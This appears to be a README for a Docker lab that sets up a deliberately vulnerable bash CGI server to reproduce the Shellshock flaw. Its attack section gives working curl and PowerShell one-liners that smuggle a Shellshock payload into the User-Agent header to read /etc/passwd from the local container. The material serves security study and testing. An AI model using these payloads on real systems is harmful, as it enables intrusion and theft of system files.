
# Shellshock

CentOS8 + Apache2 + Bash (v4.3)

### Build
Build an image from Dockerfile:
```bash
docker build -t tex2e/shellshock-cgi .
docker run -itd -p 80:80 --privileged --name shellshock-cgi tex2e/shellshock-cgi /sbin/init
```
When entering the container:
```bash
docker exec -it shellshock-cgi bash
```
- The bash containing the vulnerability is located in /usr/local/bin/bash.
- Shebang in /var/www/cgi-bin/test.cgi specifies to run /usr/local/bin/bash.

### Attack

curl：
```bash
curl -A "() { :;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
```

PowerShell：
```powershell
$Response = Invoke-WebRequest -UserAgent "() { :;}; echo `"Content-type: text/plain`"; echo; echo; /bin/cat /etc/passwd" http://localhost:80/cgi-bin/test.cgi
$Response.Content
```

### See Also

- [mubix/shellshocker-pocs: Collection of Proof of Concepts and Potential Targets for #ShellShocker](https://github.com/mubix/shellshocker-pocs)
- [docker-shellshockable/Dockerfile at master · Zenithar/docker-shellshockable](https://github.com/Zenithar/docker-shellshockable/blob/master/Dockerfile)
